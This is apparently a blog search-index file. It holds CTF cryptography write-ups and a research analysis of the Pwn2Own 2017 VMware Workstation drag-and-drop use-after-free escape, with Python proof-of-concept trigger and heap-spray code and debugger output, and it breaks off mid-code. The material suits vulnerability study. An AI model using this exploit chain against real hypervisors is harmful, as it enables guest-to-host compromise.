{"config":{"indexing":"full","jieba_dict":null,"jieba_dict_user":null,"lang":["en"],"min_search_length":3,"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":"Quote <p>I write about things I am trying to learn, or things I know which interest me. 'To teach is to learn twice.' - Joseph Joubert </p>  <p>If for whatever reason you're interested in me then please go to the about page </p>","title":"Linxz' Blog"},{"location":"about/","text":"<p>Hey, my name is Linxz. I am a vulnerability researcher who is primarily interested in hypervisor technology and kernel security. More recently I've been looking into exploit mitigations and occasionally I do some cryptography stuff.</p> <p>If you'd like to contact me you can find my links below and at the bottom of the page. I'd prefer Twitter for non-urgent matters, if you require me for professional reasons please just ask for my email, thanks.</p> <ul> <li> LinxzSec</li> <li> LinxzSec</li> <li> LinxzSec</li> <li> Linxz</li> <li></li> </ul> <p>I'm also a massive keyboard nerd. Currently I own two custom keyboards. I also own an absolute mountain of deskmats...</p> <ol> <li> <p>GMMK Pro</p> <ul> <li>Alu plate</li> <li>Alpaca Silent Linears</li> <li>Durock Screw-in V2 Alpaca Stabs</li> <li>ePBT White and Grey</li> </ul> </li> <li> <p>Tofu 60</p> <ul> <li>Brass plate</li> <li>NK Creams</li> <li>Durock Smoke Stabs</li> <li>GMK BoW</li> </ul> </li> </ol>  Note <p>If you're wondering why I've moved the blog to a new site generator the reason is that I no longer felt Hugo was sufficient for maintaining the level of quality &amp; readability I want to achieve in my posts.</p> <p>In the past I myself have found reading blog posts about exploitation incredibly difficult not because the writer had done a bad job but because the way the content was generated was not suitable for such highly technical writing. I am hoping that the features of Material for MkDocs really help overcome this problem. Unfortunately as Material for MkDocs is not a blogging engine so to speak some features that exist in Hugo don't exist here. For instance categories have been completely replaced with tags and there's no longer a reading time indicator. Hopefully these are things which can be implemented back in with time.</p>","title":"About"},{"location":"tags/","text":"","title":"Tags"},{"location":"tags/#ctf","text":"<ul> <li>NetSecFocus BSides Cymru AES Challenge</li> <li>BAE x BSides Chelt CTF</li> </ul>","title":"ctf"},{"location":"tags/#hypervisor-exploitation","text":"<ul> <li>Analysis of a VMWare Guest-to-Host Escape from Pwn2Own 2017</li> </ul>","title":"hypervisor-exploitation"},{"location":"tags/#windows-kernel-exploitation","text":"<ul> <li>HackSys Extreme Vulnerable Driver 3 - Stack Overflow + SMEP Bypass</li> <li>HackSys Extreme Vulnerable Driver 3 - Double Fetch</li> <li>HackSys Extreme Vulnerable Driver 3 - Memory Disclosure</li> </ul>","title":"windows-kernel-exploitation"},{"location":"Posts/","text":"<ul> <li>HEVD 3 - NonPagedNx Pool Memory Disclosure</li> <li>HEVD 3 - Double Fetch</li> <li>HEVD 3 - Stack Overflow + SMEP Bypass</li> <li>Pwn2Own 2017 Guest-to-Host Escape</li> </ul>","title":"Latest Posts"},{"location":"Posts/2019/2019-08-31-NetSecFocus-AES-Challenge/","tags":["ctf"],"text":"","title":"NetSecFocus BSides Cymru AES Challenge"},{"location":"Posts/2019/2019-08-31-NetSecFocus-AES-Challenge/#introduction","tags":["ctf"],"text":"<p>Tunny from NetSecFocus released a CTF challenge in order to win a ticket for BSides Cymru, as the chalelnge was cryptography related I decided to give it a go, a link to the challenge can be found here</p>","title":"Introduction"},{"location":"Posts/2019/2019-08-31-NetSecFocus-AES-Challenge/#enumeration","tags":["ctf"],"text":"<p>First, we need to work out what the challenge entails, we are told we need to decrypt two binary files and let NSF know what they say. We are also given a bash script of how the files were encrypted, let's take a look.</p> <pre><code>#!/bin/bash\n\nusage ./cyfuno.sh file file\n\n#tidy up files - work on this later\n#head -n 4 file1 &gt; discard.txt\n#tail -n +5 file1 &gt; 1.bin\n'\n\n#create unique passwords\n\npass1=\"$(openssl rand -base64 16)\"\npass2=\"$(openssl rand -base64 16)\"\n\n#create unique IVs\niv1=\"$(openssl rand -hex 8)\"\niv2=\"$(openssl rand -hex 8)\"\n\n#echo $pass1\n#echo $pass2\n#echo $iv1\n#echo $iv2\n\n#encrypt files with the unique passwords and IVs\nopenssl enc -AES-128-CTR -S \"$iv1\" -pass \"pass:$pass1\" -in \"$1\" -out \"$1.enc\"\nopenssl enc -AES-128-CTR -S \"$iv1\" -pass \"pass:$pass1\" -in \"$2\" -out \"$2.enc\"\n</code></pre> <p>The script passes two files, then some interesting \"file tidy up\" takes place. From here, the script genreates two passwords of 16 byte length using the <code>rand()</code> function in OpenSSL and outputs them in Base64 format. Then we use <code>rand()</code> again to generate two IVs of 8 byte length in hex format. If we analyse this, we should first recognise that an 8 byte IV is not correct. It should be 16 bytes to match the block size.</p> <p>Next, we see that the files we provide are encrypted using AES-128 in Counter mode, taking the IV we generated and using it as a salt for the password that we generated and then outputs the encrypted file. If you look closely we see a major problem; both files reu-use the IV &amp; the passwod! When using AES in CTR mode you should never reuse the IV or the key!</p> <p>Continuing on with the enumeration process, we now have spotted the vulnerability - the encrypted files are the victim of IV &amp; key-reuse, however we still don't know what the first part of the script is doing. We also have an additional file we did not mention, <code>discard.txt</code> if we open this file it features some rather weird content and I must admit, this puzzled me for quite a while.</p> <pre><code>P6\n# \n1000 1000\n255\n</code></pre> <p>I couldn't work out what this was. I'd never seen it before, it just looked like junk, but after extensive Googling, I figured it out. if we script back to the bash script for a moment, we see that the content for this file comes from the use of <code>head -n 4 file1 &gt; discard.txt</code> by putting this together along with the content from <code>discard.txt</code> I managed to find this post on crypto stack exchange - of course! The ECB penguin problem.</p>","title":"Enumeration"},{"location":"Posts/2019/2019-08-31-NetSecFocus-AES-Challenge/#attack","tags":["ctf"],"text":"<p>So, you might be wondering why re-using an IV or key in AES-CTR is so bad. In short; the attacker can XOR together the two ciphertexts and it recovers the plaintext. Here's the math for that. CTR mode is computed as:</p> \\[ C = P \\oplus F(Key, IV) \\] <p>The problem here is that if you encrypt two plaintexts with the same key &amp; IV the attacker is left with two pairs</p> \\[ C_1 = P_1 \\oplus F(Key, IV)\\ \\quad C_2 = P_2 \\oplus F(Key, IV)\\ \\] <p>As long as we have the values $ C_1 $ and \\(C_2\\) then we can compute the following:</p> \\[ C_1 \\oplus C_2 = P_1 \\oplus P_2 \\]","title":"Attack"},{"location":"Posts/2019/2019-12-8-BAE-ctf-crypto3/","tags":["ctf"],"text":"","title":"BAE x BSides Chelt CTF"},{"location":"Posts/2019/2019-12-8-BAE-ctf-crypto3/#introduction","tags":["ctf"],"text":"<p>BAE hosted a CTF the day before BSides Cheltenham. I played with my friends. There was a crypto challenge which I saw a number of people struggling with.</p> <p>The challenge only got three solved in total, I was the first to solve it, so I thought I'd make a writeup of how I did it.</p>","title":"Introduction"},{"location":"Posts/2019/2019-12-8-BAE-ctf-crypto3/#the-challenge","tags":["ctf"],"text":"<p>The challenge was reminiscient of the ECB penguin problem in the sense that we had two picture files in .bmp format, one was given unencrypted and the other was encrypted. The respective file names were: <code>banner.bmp</code> and <code>newbanner.bmp.aes</code> We were given a text file called <code>description.txt</code> with the following content:</p>  Quote <p>The administrator of a popular cricketing website was recently updating images on their homepage. During the updates, they accidentally uploaded an image we believe may help the England squad continue their domination of the sport. Unfortunately, the image is encrypted. We do still have a copy of the image that was replaced, if it\u2019s any help. Original file: banner.bmp New file: newbanner.bmp.aes He will have used a strong encryption key and we don\u2019t have time to brute-force it, but we\u2019re not sure what encryption mode he\u2019s used. He does seem pretty obsessed with the English Cricket Board! Is there any way you can get the information we need?</p>  <p>Our goal was to somehow decrypt the .bmp file and retrieve the flag. It's actually quite simple and doesn't involve much crypto at all.</p> <pre><code>hexdump -C banner.bmp | head -n2\n00000000  42 4d 76 5c 02 00 00 00  00 00 36 04 00 00 28 00  |BMv\\......6...(.|\n00000010  00 00 5b 05 00 00 70 00  00 00 01 00 08 00 00 00  |..[...p.........|\n</code></pre> <p>As shown, the image has a header: <code>BM</code> this is expected. Let's now issue the same command on the encrypted file.</p> <pre><code>hexdump -C newbanner.bmp.aes | head -n2\n00000000  0e a4 77 dd 6a 96 6a 76  c0 f3 69 18 ac 55 91 e4  |..w.j.jv..i..U..|\n00000010  2e 98 dc 4f bc 65 b3 8a  27 bc 6f 67 6f 2c a9 ab  |...O.e..'.ogo,..|\n</code></pre> <p>No header. Let's try simply adding the header to the encrypted file using <code>dd</code> as shown below:</p> <pre><code>dd if=banner.bmp of=newbanner.aes.bmp bs=1 count=54 conv=notrunc\n</code></pre> <p>Now if we open the encrypted image, the header has been added and we have the flag inside the image.</p>","title":"The Challenge"},{"location":"Posts/2021/2021-11-13-Pwn2Own-2017-Guest-Host-Escape/","tags":["hypervisor-exploitation"],"text":"","title":"Analysis of a VMWare Guest-to-Host Escape from Pwn2Own 2017"},{"location":"Posts/2021/2021-11-13-Pwn2Own-2017-Guest-Host-Escape/#introduction","tags":["hypervisor-exploitation"],"text":"<p>This vulnerability was found by Keen Security Lab which they showed at Pwn2Own 2017. Unfortunately, because the bug was silently patched by VMWare in 12.5.3 no CVE number was assigned, even though the vulnerability leads to remote code execution.</p>","title":"Introduction"},{"location":"Posts/2021/2021-11-13-Pwn2Own-2017-Guest-Host-Escape/#summary","tags":["hypervisor-exploitation"],"text":"<p>The vulnerability affects the Drag n Drop functionality of VMWare Workstation Pro before 12.5.3. This feature allows users to copy files from the host to the guest. However, due to a few insecure backdoor calls over an RPC interface, a Use-After-Free is present.</p> <p>In order to trigger the UAF, we have to issue RPC calls in order to change the DnD version from version 2 then to version 4. When the DnD version is changed the funtion table responsible for dispatching version 2 gets freed but any subsequent RPC calls will still reference the freed function table thus leading to a UAF.</p>","title":"Summary"},{"location":"Posts/2021/2021-11-13-Pwn2Own-2017-Guest-Host-Escape/#setup","tags":["hypervisor-exploitation"],"text":"<p>Explaining how to communicate over RPC with Python is out of the scope of this article. In my case, I have built a Python script with the necessary functions to communicate over RPC. With all of those functions created, I have then made one final function <code>RpcSendRequest</code> which sends the final requests to trigger the vulnerability.</p> <p>In the below code block, I have featured a high-level overview of the exploit chain based on the required RPC calls to trigger the vulnerability.</p> <pre><code>    dndver2 = create_string_buffer(\"tools.capability.dnd_version 2\")\n    dndver4 = create_string_buffer(\"tools.capability.dnd_version 4\")\n    chgver  = create_string_buffer(\"vmx.capability.dnd_version\")\n    sgfr     = create_string_buffer(\"dnd.setGuestFileRoot BBBBB\")\n\n    outLen = c_ulong(0x1000)\n    outbuf = kernel32.VirtualAlloc(0, outLen.value, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)\n\n    # Set Version 2\n    Rpc.SendReq(addressof(dndver2), sizeof(dndver2) - 1, outbuf, pointer(outLen))\n    outLen.value = 0x1000\n\n    # Change Version\n    Rpc.SendReq(addressof(chgver), sizeof(chgver) - 1, outbuf, pointer(outLen))\n    outLen.value = 0x1000\n\n    # Set Version 4\n    Rpc.SendReq(addressof(dndver4), sizeof(dndver4) - 1, outbuf, pointer(outLen))\n    outLen.value = 0x1000\n\n    # Change Version\n    RpcSendRequest(addressof(chgver), sizeof(chgver) - 1, outbuf, pointer(outLen))\n    outLen.value = 0x1000\n\n    RpcSendRequest(addressof(sgfr), sizeof(sgfr) - 1, outbuf, pointer(outLen))\n</code></pre> <p>Pay close attention to the final call to <code>dnd.setGuestFileRoot</code>. This RPC command dereferences a pointer on a freed object. Ultimately, this is how we trigger the vulnerability for exploitation.</p>","title":"Setup"},{"location":"Posts/2021/2021-11-13-Pwn2Own-2017-Guest-Host-Escape/#preliminary-analysis","tags":["hypervisor-exploitation"],"text":"<p>First things first, we are going to open all of the relevant functions in IDA to better understand how this vulnerability was found and fits together. Starting with; <code>tools.capability.dnd_version</code>.</p>","title":"Preliminary Analysis"},{"location":"Posts/2021/2021-11-13-Pwn2Own-2017-Guest-Host-Escape/#toolscapabilitydnd_version","tags":["hypervisor-exploitation"],"text":"<p>Doing a text search for \"tools.capability.dnd_version\" in IDA, we can find the string in a dispatcher table. Based on previous analysis, I know that the function is the one referenced in the <code>lea r9, sub_xxxxx</code> instruction.</p>  <p></p>  <p>In this case, that means that <code>sub_88220</code> is our target function. Fortunately for us, there isn't too much code to go through. There are a number of validation checks that we need to pass. The first one being that the function must take at least one argument, i.e, the version number.</p>  <p></p>  <p>The second check is a check on whether the inputted argument is an integer or not, we can confirm this based on the failure block seen below.</p>  <p></p>  <p>The third check checks whether the inputted argument is an integer greater than or equal to 2. If it is not then the failure block shown below is taken.</p>  <p></p>   <p></p>  <p>Following these checks the execution is brought into <code>sub_70610</code>. Now, going deeper on how the version switch works is out of the scope of the article, however, below is a big picture of that function just in-case you wanted to further investigate. Keep in mind, this is from version 12, VMWare will have changed significantly.</p>  <p></p>  <p>If we further investigate the return from this function, we can see that a check is performed to confirm if the version was set correctly.</p>  <p></p>  <p>Perhaps one point of further investigation if you are interested, is working out why we take an extra function if the the static version 3 is less than the inputted argument. Shown in the screenshot below. (My guess is compatibility reasons).</p>  <p></p>","title":"tools.capability.dnd_version"},{"location":"Posts/2021/2021-11-13-Pwn2Own-2017-Guest-Host-Escape/#vmxcapabilitydnd_version","tags":["hypervisor-exploitation"],"text":"<p>Next up, we are going to investigate <code>vmx.capability.dnd_version</code> since we know already that this request is what switches the version over. That means that <code>tools.capability.dnd_version</code> sets the version, but this call makes the switch. Let's take a closer look at how this call works.</p>  <p></p>  <p>We can rename <code>sub_83F30</code> to its correct name now, <code>vmx.capability.dnd_verison</code>. It is quite a simple function, in-fact. Firstly there is a check to make sure we didn't pass an argument, if we did then the function will fail.</p>  <p></p>  <p>Again, we see that use of <code>sub_67D80</code>, which we assume is some kind of event log/tear down function, something like that. Assuming we don't pass an argument, this function is quite simple on the surface. There are a few nested calls, however, that is out the scope of this article.</p>  <p></p>  <p>Further analysis out of the scope of this article however if you are interested in performing further analysis, the rest of the function is shown above.</p>","title":"vmx.capability.dnd_version"},{"location":"Posts/2021/2021-11-13-Pwn2Own-2017-Guest-Host-Escape/#recap","tags":["hypervisor-exploitation"],"text":"<p>Before examining the final function, let's do a quick recap of what we know so far;</p> <p>1) We use <code>tools.capability.dnd_version</code> to set the version we want. 2) We use <code>vmx.capability.dnd_version</code> to change the version.</p> <p>We also know if we set the version to 2, then change the version, then set it to 4 and then change it again, any subsequent call to <code>dnd.setGuestFileRoot</code> triggers a Use-After-Free. Let's investigate this function <code>dnd.setGuestFileRoot</code> to try and better understand why that occurs.</p>","title":"Recap"},{"location":"Posts/2021/2021-11-13-Pwn2Own-2017-Guest-Host-Escape/#dndsetguestfileroot","tags":["hypervisor-exploitation"],"text":"<p>We'll have to perform a text search for this string because it isn't anywhere to be seen in the dispatcher table we found the previous two functions in. A search reveals that it is indeed in a different dispatcher table, shown below.</p>  <p></p>  <p>Based on this screenshot, and our knowledge of the previous dispatcher table it is clear that <code>sub_9D090</code> is the function <code>dnd.setGuestFileRoot</code>. Remember, we know that this function is responsible for triggering the UAF. That is due to the fact this function is responsible for dereferencing the freed object. </p>  <p></p>  <p>In-fact, something I learned while researching this bug is that any <code>dnd.xxxx</code> function would trigger the Use-After-Free, this was noted in the following post on ZDI</p> <pre><code>&gt;   tools.capability.dnd_version 2 \n&gt;   vmx.capability.dnd_version\n&gt;   tools.capability.dnd_version 3\n&gt;   vmx.capability.dnd_version\n&gt;   dnd.setGuestFileRoot AAAAA // Technically any DnD function would work.\n</code></pre> <p>We can opt to test (and understand this theory for ourselves). Let's take a look at some of the other <code>dnd</code> functions from a high level in IDA.</p>  <p></p>  <p>As you can see, they are in-fact, almost indetical. From this we can assume that the <code>mov rax, [rcx]</code> is the reuse. Since they all make this dereference and we know that causes the crash from previous research. We can confirm this theory by running our POC with PageHeap enabled in order to confirm if each of these function calls trigger the crash. First up, using the <code>dnd.setGuestFileRoot</code> payload.</p> <pre><code>(126c.9c): Access violation - code c0000005 (first chance)\nFirst chance exceptions are reported before any exception handling.\nThis exception may be expected and handled.\nvmware_vmx+0x9d0aa:\n00007ff6`e755d0aa 488b01          mov     rax,qword ptr [rcx] ds:00000000`26b9ef40=????????????????\n0:013&gt; !heap -p -a @rcx\n    address 0000000026b9ef40 found in\n    _DPH_HEAP_ROOT @ 40b1000\n    in free-ed allocation (  DPH_HEAP_BLOCK:         VirtAddr         VirtSize)\n                                   25dbcb60:         26b9e000             2000\n    00007ffc14cc3fa1 ntdll!RtlDebugFreeHeap+0x0000000000032eb5\n    00007ffc14cb95c9 ntdll!RtlpFreeHeap+0x00000000000866a9\n    00007ffc14c311fd ntdll!RtlFreeHeap+0x000000000000041d\n    00000000594bcabc MSVCR90!free+0x000000000000001c [f:\\dd\\vctools\\crt_bld\\self_64_amd64\\crt\\src\\free.c @ 110]\n    00007ff6e7562d27 vmware_vmx+0x00000000000a2d27\n\n    // Removed for brevity.\n</code></pre> <p>As expected, the Use-After-Free triggers an access violation. Now let's modify the payload and try using <code>dnd.feedback</code> instead. As assumed, the crash does indeed trigger.</p> <pre><code>(197c.168): Access violation - code c0000005 (first chance)\nFirst chance exceptions are reported before any exception handling.\nThis exception may be expected and handled.\nvmware_vmx+0x9d19a:\n00007ff6`e755d19a 488b01          mov     rax,qword ptr [rcx] ds:00000000`263c5f40=????????????????\n0:013&gt; !heap -p -a @rcx\n    address 00000000263c5f40 found in\n    _DPH_HEAP_ROOT @ 4b71000\n    in free-ed allocation (  DPH_HEAP_BLOCK:         VirtAddr         VirtSize)\n                                   26607068:         263c5000             2000\n    00007ffc14cc3fa1 ntdll!RtlDebugFreeHeap+0x0000000000032eb5\n    00007ffc14cb95c9 ntdll!RtlpFreeHeap+0x00000000000866a9\n    00007ffc14c311fd ntdll!RtlFreeHeap+0x000000000000041d\n    00000000594bcabc MSVCR90!free+0x000000000000001c [f:\\dd\\vctools\\crt_bld\\self_64_amd64\\crt\\src\\free.c @ 110]\n    00007ff6e7562d27 vmware_vmx+0x00000000000a2d27\n\n    // Removed for brevity.\n</code></pre> <p>Great. So the post was right, any dnd function will trigger this Use-Afrer-Free. Our next question is... Why? Of course, we already know the reason for that, because all of these dnd functions perform a dereference on the freed object. Let's now take some time to analyse the crash in more detail. After which, we can begin exploitation.</p>","title":"dnd.setGuestFileRoot"},{"location":"Posts/2021/2021-11-13-Pwn2Own-2017-Guest-Host-Escape/#analysing-the-crash","tags":["hypervisor-exploitation"],"text":"<p>Based on the outputs that we retrieved using Page Heap, we can see the entire chain that leads up to the free and subsequently the dereference that causes the crash. We'll analyse the crash from <code>dnd.setGuestFileRoot</code> for the sake of article uniformity. If we jump to the offset that caused the crash <code>vmware_vmx+0x9d0aa</code> we find that our presumption of the <code>mov rax, [rcx]</code> instruction causing the crash was correct.</p>  <p></p>  <p>What we're really interested in of course is the steps which lead up to the crash. From the output already given based on Page Heap, we can see where the return following the free is.</p>  <p></p>  <p>If we open the <code>opus_repacketizer_destroy</code> function in IDA, we clearly see that it makes a call to free.</p>  <p></p>  <p>Great, so there's the actual free which results in the Use-After-Free. Now, we could go through each location in the Page Heap traceback individually, but that would make this article extremely long. If you're interested understanding more about the objects lifetime, below is the stack trace and heap page output for you to trace yourself.</p> <pre><code>0:012&gt; !heap -p -a @rcx\n    address 000000001e2aef40 found in\n    _DPH_HEAP_ROOT @ 4961000\n    in free-ed allocation (  DPH_HEAP_BLOCK:         VirtAddr         VirtSize)\n                                   1e6f2a28:         1e2ae000             2000\n    00007ffc14cc3fa1 ntdll!RtlDebugFreeHeap+0x0000000000032eb5\n    00007ffc14cb95c9 ntdll!RtlpFreeHeap+0x00000000000866a9\n    00007ffc14c311fd ntdll!RtlFreeHeap+0x000000000000041d\n    00000000594bcabc MSVCR90!free+0x000000000000001c [f:\\dd\\vctools\\crt_bld\\self_64_amd64\\crt\\src\\free.c @ 110]\n    00007ff6e7562d27 vmware_vmx+0x00000000000a2d27\n    00007ff6e755c48d vmware_vmx+0x000000000009c48d\n    00007ff6e753a57e vmware_vmx+0x000000000007a57e\n    00007ff6e7543fb0 vmware_vmx+0x0000000000083fb0\n    00007ff6e7529486 vmware_vmx+0x0000000000069486\n    00007ff6e754bbd6 vmware_vmx+0x000000000008bbd6\n    00007ff6e757aea0 vmware_vmx+0x00000000000baea0\n    00007ff6e757af24 vmware_vmx+0x00000000000baf24\n    00007ff6e786b4a5 vmware_vmx!opus_repacketizer_get_nb_frames+0x000000000015ffb5\n    00007ff6e78492f5 vmware_vmx!opus_repacketizer_get_nb_frames+0x000000000013de05\n    00007ff6e787b992 vmware_vmx!opus_repacketizer_get_nb_frames+0x00000000001704a2\n    00007ff6e7849668 vmware_vmx!opus_repacketizer_get_nb_frames+0x000000000013e178\n    00007ff6e76b007b vmware_vmx+0x00000000001f007b\n    00007ffc13ed2774 KERNEL32!BaseThreadInitThunk+0x0000000000000014\n    00007ffc14c70d61 ntdll!RtlUserThreadStart+0x0000000000000021\n\n0:012&gt; k\n # Child-SP          RetAddr           Call Site\n00 00000000`3cf974c0 00007ff6`e7529486 vmware_vmx+0x9d0aa\n01 00000000`3cf974f0 00007ff6`e754bbd6 vmware_vmx+0x69486\n02 00000000`3cf97590 00007ff6`e757aea0 vmware_vmx+0x8bbd6\n03 00000000`3cf975c0 00007ff6`e757af24 vmware_vmx+0xbaea0\n04 00000000`3cf97610 00007ff6`e786b4a5 vmware_vmx+0xbaf24\n05 00000000`3cf97650 00007ff6`e78492f5 vmware_vmx!opus_repacketizer_get_nb_frames+0x15ffb5\n06 00000000`3cf9f730 00007ff6`e787b992 vmware_vmx!opus_repacketizer_get_nb_frames+0x13de05\n07 00000000`3cf9f760 00007ff6`e7849668 vmware_vmx!opus_repacketizer_get_nb_frames+0x1704a2\n08 00000000`3cf9f790 00007ff6`e76b007b vmware_vmx!opus_repacketizer_get_nb_frames+0x13e178\n09 00000000`3cf9f910 00007ffc`13ed2774 vmware_vmx+0x1f007b\n0a 00000000`3cf9f970 00007ffc`14c70d61 KERNEL32!BaseThreadInitThunk+0x14\n0b 00000000`3cf9f9a0 00000000`00000000 ntdll!RtlUserThreadStart+0x21\n</code></pre> <p>Before we dig into exploitation, we need to know the size of the object, we can get this by setting a breakpoint just before the free occurs and analysing the heap.</p> <pre><code>Breakpoint 0 hit\nvmware_vmx+0xa2d1f:\n00007ff6`e7562d1f 488bcf          mov     rcx,rdi\n\n0:013&gt; p\nvmware_vmx+0xa2d22:\n00007ff6`e7562d22 e819ee3500      call    vmware_vmx!opus_decoder_destroy (00007ff6`e78c1b40)\n\n0:013&gt; !heap -p -a rcx\n    address 0000000030522f40 found in\n    _DPH_HEAP_ROOT @ 4821000\n    in busy allocation (  DPH_HEAP_BLOCK:         UserAddr         UserSize -         VirtAddr         VirtSize)\n                                30621410:         30522f40               b8 -         30522000             2000\n          ? vmware_vmx!opus_get_version_string+7c548\n    00007ffc14cc3f7f ntdll!RtlDebugAllocateHeap+0x0000000000033227\n    00007ffc14cb8294 ntdll!RtlpAllocateHeap+0x000000000008a7c4\n    00007ffc14c2b89a ntdll!RtlpAllocateHeapInternal+0x0000000000000a0a\n    00000000594bcb87 MSVCR90!malloc+0x000000000000005b [f:\\dd\\vctools\\crt_bld\\self_64_amd64\\crt\\src\\malloc.c @ 163]\n    00007ff6e7894ecf vmware_vmx!opus_repacketizer_get_nb_frames+0x00000000001899df\n    00007ff6e755c56a vmware_vmx+0x000000000009c56a\n</code></pre> <p>Based on the output above, we can see that the freed object size is 0xb8. And based on information from the aforementioned ZDI article, we know that the dangling pointer is kept in an object size of 0x38, which gets allocated when the VM starts.</p>","title":"Analysing the Crash"},{"location":"Posts/2021/2021-11-13-Pwn2Own-2017-Guest-Host-Escape/#reallocation","tags":["hypervisor-exploitation"],"text":"<p>As with the exploitation of all UAFs the most important thing we require is the ability to reallocate the freed object with our own data. We also need to keep in mind that the reallocation must end up in the same heap as the freed allocation, otherwise we won't be able to control the freed data. How the heap works is out of the scope of this article, but if you're not familar with the heap then I would recommend you understand that first, before preceding.</p> <p>Based on previous research by MarvelTeam there are a few ways in which we can perform reallocation for this vulnerability. Two commonly used RPC calls are; <code>tools.capability.guest_temp_directory</code> and <code>guest.upgrader_send_cmd_line_args</code>. There are others as well, such as;</p> <ul> <li><code>info-get</code></li> <li><code>info-set</code></li> <li><code>ToolsAutoInstallGetParams</code></li> </ul>","title":"Reallocation"},{"location":"Posts/2021/2021-11-13-Pwn2Own-2017-Guest-Host-Escape/#toolscapabilityguest_temp_directory","tags":["hypervisor-exploitation"],"text":"<p>We want to test that we can in-fact use these RPC commands to allocate in the same LFH. We can do this by simply executing one of the commands with our own data and then searching the application for the data. But remember, the LFH is randomised so we need to beat it. In this case, that is actually quite simple. There is nothing stopping us from sending the command muiltiple times in order to flood the target LFH.</p> <p>It isn't possible for us to know exactly how many times we need to send the request to obtain allocation in the target, so this is where trial and error comes in. Eventually we find perfect allocation at 0x40.</p> <pre><code>    cmd = create_string_buffer(\"tools.capability.guest_temp_directory AAAA..AAAA\")\n    inbuf = kernel32.VirtualAlloc(0, 0xb0 + sizeof(cmd) - 1, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)\n    memmove(inbuf, addressof(cmd), sizeof(cmd) - 1)\n    memset(inbuf + sizeof(cmd) - 1, 0x41, 0xa7)\n\n    outLen = c_ulong(0x1000)\n    outbuf = kernel32.VirtualAlloc(0, outLen.value, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)\n\n    for i in range(0x40):\n        RpcSendRequest(inbuf, 0xb0 + sizeof(cmd) - 1, outbuf, pointer(outLen))\n</code></pre> <p>After running this POC and checking the output, it is clear that we do in-fact gain allocation in the target block. This can be seen below.</p> <pre><code>Breakpoint 0 hit\nvmware_vmx+0x9d0aa:\n00007ff7`e209d0aa 488b01          mov     rax,qword ptr [rcx] ds:00000000`03a62d20=41412e2e2e414141\n0:013&gt; dd ecx\n00000000`03a62d20  2e414141 41412e2e 41414141 41414141\n00000000`03a62d30  41414141 41414141 41414141 41414141\n00000000`03a62d40  41414141 41414141 41414141 41414141\n00000000`03a62d50  41414141 41414141 41414141 41414141\n00000000`03a62d60  41414141 41414141 41414141 41414141\n00000000`03a62d70  41414141 41414141 41414141 41414141\n00000000`03a62d80  41414141 41414141 41414141 41414141\n00000000`03a62d90  41414141 41414141 41414141 41414141\n</code></pre>","title":"tools.capability.guest_temp_directory"},{"location":"Posts/2021/2021-11-13-Pwn2Own-2017-Guest-Host-Escape/#guestupgradersend_cmd_line_args","tags":["hypervisor-exploitation"],"text":"<p>Equally, we can also test that this RPC command works in the same way as <code>tools.capability.guest_temp_directory</code>, as it turns out, it does. In-fact, all RPC guest commands share the same LFH, therefore pretty much any of them will work. But, not all of them are completely ideal for various reasons.</p> <pre><code>    cmd = create_string_buffer(\"guest.upgrader.send_cmd_line_args AAAA\")\n    inbuf = kernel32.VirtualAlloc(0, 0xb0 + sizeof(cmd) - 1, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)\n    memmove(inbuf, addressof(cmd), sizeof(cmd) - 1)\n    memset(inbuf + sizeof(cmd) - 1, 0x41, 0xa7)\n\n    outLen = c_ulong(0x1000)\n    outbuf = kernel32.VirtualAlloc(0, outLen.value, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)\n\n    for i in range(0x40):\n        RpcSendRequest(inbuf, 0xb0 + sizeof(cmd) - 1, outbuf, pointer(outLen))\n</code></pre> <p>After running this POC and checking the output, it is clear that we do in-fact gain allocation in the target block. This can be seen below.</p> <pre><code>Breakpoint 0 hit\nvmware_vmx+0x9d0aa:\n00007ff7`e209d0aa 488b01          mov     rax,qword ptr [rcx] ds:00000000`03a62d20=41414141414141414141414141414141\n0:013&gt; dd ecx\n00000000`03a62d20  41414141 41414141 41414141 41414141\n00000000`03a62d30  41414141 41414141 41414141 41414141\n00000000`03a62d40  41414141 41414141 41414141 41414141\n00000000`03a62d50  41414141 41414141 41414141 41414141\n00000000`03a62d60  41414141 41414141 41414141 41414141\n00000000`03a62d70  41414141 41414141 41414141 41414141\n00000000`03a62d80  41414141 41414141 41414141 41414141\n00000000`03a62d90  41414141 41414141 41414141 41414141\n</code></pre>","title":"guest.upgrader.send_cmd_line_args"},{"location":"Posts/2021/2021-11-13-Pwn2Own-2017-Guest-Host-Escape/#avoiding-nulls","tags":["hypervisor-exploitation"],"text":"<p>User-mode addresses on 64-bit systems always contain a NULL word (due to their length), this prevents a problem in our case. The command expects a NULl terminated string as an argument. This means that if we were to put a pointer in the argument, for example a pointer to a ROP gadget, due to the NULL byte in the address, the argument string would be terminated early and and our content would be allocated to a smaller bucket. This means that using this function isn't going to work because we need to use ROP gadgets to bypass DEP and take control of the application flow. We can test this theory out by placing a fake pointer in our buffer and checking the contents of ECX.</p> <pre><code>Breakpoint 0 hit\nvmware_vmx+0x9d0aa:\n00007ff7`e209d0aa 488b01          mov     rax,qword ptr [rcx] ds:00000000`059525f0=00007ff7e27a74a8\n\n0:012&gt; dd ecx\n00000000`059525f0  e27a74a8 00007ff7 03dae8a0 00000000\n00000000`05952600  05b63470 00000000 05b632b0 00000000\n00000000`05952610  03b6b320 00000000 00000003 00000000\n00000000`05952620  cec10001 00000000 00000000 00000000\n00000000`05952630  00000000 00000000 00000000 00000000\n00000000`05952640  00000000 00000000 00000000 00000000\n00000000`05952650  00000000 00000000 00000000 00000000\n00000000`05952660  00000000 00000000 00000000 00000000\n</code></pre> <p>As you can see, if we attempt to put a fake pointer in the buffer, once the NULL byte is detected, it cuts the allocation short and our allocation doesn't work as it did before. This is a huge problem because as we explained, user-mode addresses in 64-bit contains NULL bytes.</p> <p>To get around this we are going to adopt a different reallocation technique. If we look back at <code>RpcSendRequest</code> we see that our function first sends the data size through <code>MessageSendSize</code> and then sends the actual payload through <code>MessageSendData</code>. Based on our testing, we know that all RPC requests are served by the same LFH heap. We can try to use this to directly use these two functions to perform reallocation control rather than relying on a specific RPC command.</p> <p>We are going to update our proof of concept with two very unique sizes for <code>MessageSendSize</code> and <code>MessageSendData</code> respectively. You can see the changes in the below code block.</p> <pre><code>def 